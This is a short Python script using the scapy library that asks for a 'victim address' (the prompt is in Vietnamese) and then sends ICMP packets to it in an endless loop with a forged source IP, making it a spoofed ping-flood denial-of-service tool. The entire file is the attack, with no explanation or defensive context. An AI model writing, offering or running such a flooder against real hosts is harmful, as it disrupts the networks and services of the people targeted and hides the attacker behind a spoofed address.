from scapy.all import *
diachi=raw_input("Nhap dia chi nan nhan: ")
while True:
    send(IP(src="192.168.248.110", dst=diachi)/ICMP())